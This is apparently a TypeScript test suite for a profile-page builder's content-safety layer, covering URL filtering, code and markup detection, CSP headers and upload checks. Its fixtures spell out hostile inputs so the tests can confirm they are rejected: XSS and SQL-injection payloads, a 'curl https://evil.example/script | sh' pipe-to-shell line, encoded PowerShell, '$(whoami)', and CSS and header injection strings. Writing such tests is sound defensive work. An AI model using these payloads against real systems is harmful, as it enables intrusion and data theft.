import assert from "node:assert/strict";
import test from "node:test";
import { defaultProfile, type Profile } from "../src/lib/link-store";
import { TEMPLATES, previewProfileForTemplate } from "../src/lib/templates";
import {
  isSafeContentUrl,
  safePreviewProfile,
  validateProfileContent,
  validateBlockContent,
  CONTENT_LIMITS,
} from "../src/lib/content-safety";
import { assertUploadFile, sniffMediaType } from "../src/lib/file-safety";
import { localTextViolation, isBlockedContentHost } from "../src/lib/content-policy";
import { containsCodeContent } from "../src/lib/code-content";
import { createCspNonce, documentSecurityHeaders } from "../src/lib/security-headers";
import {
  accountNameSchema,
  onboardingSchema,
  validNewPassword,
} from "../src/lib/account-validation";

test("all existing templates remain valid after replacing unfinished link placeholders", () => {
  assert.ok(validateProfileContent(defaultProfile).profile);
  for (const template of TEMPLATES) {
    const profile = previewProfileForTemplate(defaultProfile, template);
    profile.blocks = profile.blocks.map((b) => ({
      ...b,
      url: b.url === "https://" ? "https://example.com" : b.url,
    }));
    const result = validateProfileContent(profile);
    assert.deepEqual(result.issues, [], template.id);
  }
});

test("URLs reject executable schemes, credentials, private addresses and active image documents", () => {
  for (const url of [
    "javascript:alert(1)",
    "data:text/html;base64,PHNjcmlwdD4=",
    "file:///etc/passwd",
    "//example.com",
    "https://user:pass@example.com",
    "http://127.0.0.1",
    "http://2130706433",
    "http://[::1]",
    "https://printer.local",
    "https://example.com/%0afoo",
    "https://example.com\\@127.0.0.1",
    "https://example.com\u202eevil",
  ])
    assert.equal(isSafeContentUrl(url), false, url);
  assert.equal(isSafeContentUrl("https://example.com/picture.svg", "image"), false);
  assert.equal(isSafeContentUrl("https://example.com/clip.mp4", "video"), true);
  assert.equal(isSafeContentUrl("https://www.youtube.com/watch?v=abc12345678", "video"), true);
  assert.equal(
    isSafeContentUrl("https://youtube.com.evil.example/watch?v=abc12345678", "video"),
    false,
  );
  assert.equal(isSafeContentUrl("/music/lofi/1.mp3", "audio"), true);
  assert.equal(
    isSafeContentUrl(
      "http://localhost:3001/api/music/file/aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa",
      "audio",
    ),
    true,
  );
  assert.equal(isSafeContentUrl("https://example.com/picture.webp", "image"), true);
});

test("local policy handles Unicode normalization, hidden separators and whole host boundaries", () => {
  assert.ok(localTextViolation("ＰＯＲＮ"));
  assert.ok(localTextViolation("po\u200brn"));
  assert.equal(localTextViolation("Piano, art, O'Connor and a murder mystery review"), null);
  assert.equal(isBlockedContentHost("www.pornhub.com"), true);
  assert.equal(isBlockedContentHost("notpornhub.com"), false);
  assert.equal(isSafeContentUrl("https://www.pornhub.com"), false);
});

test("nested content, split rich text, excessive arrays and unknown fields cannot bypass policy", () => {
  const base = structuredClone(defaultProfile);
  for (const blocks of [
    [
      {
        id: "a",
        type: "faq",
        faqItems: [{ id: "q", question: "Hello", answer: "I will kill you" }],
      },
    ],
    [{ id: "a", type: "text", textRuns: [{ text: "po" }, { text: "rn" }] }],
    [{ id: "a", type: "link", url: "javascript:alert(1)" }],
    [
      {
        id: "a",
        type: "gallery",
        galleryImages: Array.from({ length: 21 }, (_, i) => ({ id: String(i), image: "" })),
      },
    ],
    [
      { id: "a", type: "header" },
      { id: "a", type: "text" },
    ],
    [{ id: "a", type: "text", textRuns: [{ text: "x".repeat(CONTENT_LIMITS.text + 1) }] }],
    [{ id: "a", type: "divider", dividerThickness: Infinity }],
    [
      {
        id: "a",
        type: "faq",
        faqItems: [
          { id: "same", question: "a", answer: "b" },
          { id: "same", question: "c", answer: "d" },
        ],
      },
    ],
  ])
    assert.equal(validateProfileContent({ ...base, blocks }).profile, null);
  assert.equal(validateProfileContent({ ...base, html: "<script>" }).profile, null);
  assert.equal(
    validateProfileContent({
      ...base,
      blocks: Array.from({ length: 101 }, (_, i) => ({ id: String(i), type: "header" })),
    }).profile,
    null,
  );
  assert.ok(
    validateBlockContent({ id: "a", type: "text", textRuns: [{ text: "po" }, { text: "rn" }] })
      .length,
  );
  assert.equal(
    validateProfileContent({
      ...base,
      blocks: [
        { id: "a", type: "text", textRuns: [{ text: "<script>alert('example')</script>" }] },
      ],
    }).profile,
    null,
    "code is rejected even when React would display it as inert text",
  );
});

test("public text rejects markup and common JS, CSS, SQL, shell and language syntax", () => {
  for (const code of [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    '<iframe srcdoc="<script>alert(1)</script>">',
    "<!-- hidden markup -->",
    '<?php system("id"); ?>',
    "const secret = 1;",
    "function run() {}",
    "for (;;) {}",
    "fn main() {}",
    "$(whoami)",
    "(x) => x + 1",
    'document.cookie = "x"',
    'eval("x")',
    "body { color: red; }",
    '@import "https://evil.example/style.css";',
    "expression(alert(1))",
    "SELECT * FROM users;",
    "DROP TABLE users;",
    "' OR 1=1 --",
    "UNION ALL SELECT password FROM users",
    "curl https://evil.example/script | sh",
    "powershell -EncodedCommand AA==",
    'def run():\n  print("x")',
    "import os",
    "public class Main {}",
    "#include <stdio.h>",
    "```rust\nfn main() {}\n```",
    "${process.env.SECRET}",
    '{{constructor.constructor("alert(1)")()}}',
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "&#x3c;script&#x3e;alert(1)",
    "%253Cscript%253Ealert(1)%253C/script%253E",
    "\\u003cscript\\u003ealert(1)",
    "<scr\u200bipt>alert(1)</script>",
    "＜script＞alert(1)＜/script＞",
  ])
    assert.equal(containsCodeContent(code), true, code);
  for (const prose of [
    "O'Connor & Sons",
    "Music, C++ and JavaScript developer",
    "Rock & roll — 2 < 3 and 5 > 4",
    "I use CSS for my projects.",
    "Email me: hello@example.com",
    "Выбери любимую музыку 🎵",
  ]) {
    assert.equal(containsCodeContent(prose), false, prose);
    assert.ok(validateProfileContent({ ...defaultProfile, bio: prose }).profile, prose);
  }
  assert.equal(
    validateProfileContent({
      ...defaultProfile,
      blocks: [
        { id: "t", type: "text", textRuns: [{ text: "<scr" }, { text: "ipt>alert(1)</script>" }] },
      ],
    }).profile,
    null,
  );
  assert.equal(isSafeContentUrl("https://example.com/?q=%3Cscript%3Ealert(1)%3C/script%3E"), false);
  assert.equal(accountNameSchema.safeParse("<script>alert(1)</script>").success, false);
  assert.throws(() =>
    assertUploadFile({ name: "payload.py.png", type: "image/png", size: 24 }, "image"),
  );
  assert.equal(
    validNewPassword("<script>alert(1)</script>"),
    true,
    "passwords are secrets, not public content",
  );
});

test("CSP uses independent cryptographic nonces and blocks inline handlers, eval and arbitrary embeds", () => {
  const nonce = createCspNonce(),
    other = createCspNonce();
  assert.notEqual(nonce, other);
  const headers = documentSecurityHeaders(nonce, "https://api.example.com");
  const csp = headers["Content-Security-Policy"];
  assert.ok(csp.includes(`script-src 'nonce-${nonce}' 'strict-dynamic' 'self'`));
  assert.ok(csp.includes("script-src-attr 'none'"));
  assert.ok(csp.includes("object-src 'none'"));
  assert.ok(csp.includes("base-uri 'none'"));
  assert.ok(csp.includes("connect-src 'self' https://api.example.com"));
  assert.equal(csp.includes("unsafe-eval"), false);
  assert.equal(
    csp
      .split("; ")
      .find((rule) => rule.startsWith("script-src "))
      ?.includes("unsafe-inline"),
    false,
  );
  assert.equal(headers["Cache-Control"], "private, no-store");
  assert.throws(() =>
    documentSecurityHeaders("injected'; script-src *", "https://api.example.com"),
  );
});

test("unsafe draft destinations are removed without destroying editable text", () => {
  const raw: Profile = {
    ...defaultProfile,
    avatar: "javascript:alert(1)",
    music: { enabled: true, url: "data:text/html,evil" },
    blocks: [
      {
        id: "a",
        type: "link",
        title: "Draft",
        url: "javascript:alert(1)",
        email: "a@example.com?subject=evil",
      },
    ],
  };
  const safe = safePreviewProfile(raw);
  assert.equal(safe.avatar, "");
  assert.equal(safe.music?.url, "");
  assert.equal(safe.blocks[0].url, "");
  assert.equal(safe.blocks[0].email, "");
  assert.equal(safe.blocks[0].title, "Draft");
  assert.equal(raw.blocks[0].url, "javascript:alert(1)", "source draft is preserved");
  const colors = safePreviewProfile({
    ...defaultProfile,
    accentColor: "red; background: url(https://evil.example)",
    blocks: [
      {
        id: "color",
        type: "text",
        textColor: "url(https://evil.example)",
        textRuns: [{ text: "hello", color: "red; display:none" }],
      },
    ],
  });
  assert.equal(colors.accentColor, undefined);
  assert.equal(colors.blocks[0].textColor, undefined);
  assert.equal(colors.blocks[0].textRuns?.[0].color, undefined);
});

test("file validation checks extension, claimed MIME, signature, filename and byte limits", () => {
  const png = Uint8Array.from([137, 80, 78, 71, 13, 10, 26, 10, 0, 0, 0, 0]);
  const file = { name: "photo.png", type: "image/png", size: png.length };
  assert.equal(assertUploadFile(file, "image", png), "image/png");
  for (const change of [
    { name: "payload.svg.png" },
    { name: "../photo.png" },
    { type: "image/jpeg" },
    { size: CONTENT_LIMITS.imageBytes + 1 },
    { size: 0 },
  ])
    assert.throws(() => assertUploadFile({ ...file, ...change }, "image", png));
  assert.throws(() =>
    assertUploadFile(file, "image", new TextEncoder().encode("<html>fake PNG image</html>")),
  );
  assert.equal(sniffMediaType(new TextEncoder().encode("<svg>fake file</svg>")), null);
  const wav = new TextEncoder().encode("RIFF0000WAVE0000");
  assert.equal(
    assertUploadFile({ name: "track.wav", type: "audio/x-wav", size: wav.length }, "audio", wav),
    "audio/wav",
  );
});

test("account inputs are bounded while secrets retain their characters", () => {
  assert.ok(accountNameSchema.safeParse("O'Connor 李").success);
  assert.equal(accountNameSchema.safeParse("x".repeat(101)).success, false);
  assert.equal(onboardingSchema.safeParse({ purpose: "creator", vibe: "dark" }).success, true);
  assert.equal(onboardingSchema.safeParse({ arbitrary: "payload" }).success, false);
  assert.equal(validNewPassword("a".repeat(72)), true);
  assert.equal(validNewPassword("界".repeat(25)), false);
  assert.equal(validNewPassword("password' <&>"), true);
});
